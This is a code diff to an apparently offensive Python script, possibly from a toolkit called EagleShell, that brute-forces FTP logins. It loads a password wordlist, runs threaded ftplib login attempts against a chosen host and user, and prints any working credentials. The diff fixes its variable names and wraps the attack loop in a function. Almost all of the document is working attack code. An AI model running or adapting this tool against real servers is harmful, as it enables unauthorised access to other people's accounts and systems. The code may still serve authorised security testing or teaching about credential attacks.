@@ -63,10 +63,11 @@ def bruteftp_main():
                 bruteftp_main()
             elif host_set == 'x' or user_set == 'x' or port_set == 'x':
                 exit_shell()
-
+            brute_forcing()
         except KeyboardInterrupt:
             exit_shell()
 
+    # Function that connects to FTP
     def connect_ftp():
         global q
         while True:
@@ -77,17 +78,17 @@ def bruteftp_main():
             print("[!] Trying", password)
             try:
                 # tries to connect to FTP server with a timeout of 5
-                server.connect(host, port, timeout=5)
+                server.connect(host_set, port_set, timeout=5)
                 # login using the credentials (user & password)
-                server.login(user, password)
+                server.login(user_set, password)
             except ftplib.error_perm:
                 # login failed, wrong credentials
                 pass
             else:
                 # correct credentials
                 print(f"{Fore.GREEN}[+] Found credentials: ")
-                print(f"\tHost: {host}")
-                print(f"\tUser: {user}")
+                print(f"\tHost: {host_set}")
+                print(f"\tUser: {user_set}")
                 print(f"\tPassword: {password}{Fore.RESET}")
                 # we found the password, let's clear the queue
                 with q.mutex:
@@ -98,23 +99,25 @@ def bruteftp_main():
                 # notify the queue that the task is completed for this password
                 q.task_done()
 
-    # read the wordlist of passwords
-    passwords = open("wordlist.txt").read().split("\n")
+    # Function that does the brute force
+    def brute_forcing():
+        # read the wordlist of passwords
+        passwords = open("/opt/EagleShell/wordlist.txt").read().split("\n")
 
-    print("[+] Passwords to try:", len(passwords))
+        print("[+] Passwords to try:", len(passwords))
 
-    # put all passwords to the queue
-    for password in passwords:
-        q.put(password)
+        # put all passwords to the queue
+        for password in passwords:
+            q.put(password)
 
-    # create `n_threads` that runs that function
-    for t in range(n_threads):
-        thread = Thread(target=connect_ftp)
-        # will end when the main thread end
-        thread.daemon = True
-        thread.start()
-    # wait for the queue to be empty
-    q.join()
+        # create `n_threads` that runs that function
+        for t in range(n_threads):
+            thread = Thread(target=connect_ftp)
+            # will end when the main thread end
+            thread.daemon = True
+            thread.start()
+        # wait for the queue to be empty
+        q.join()
 
     # The function where you exit
     def exit_shell():
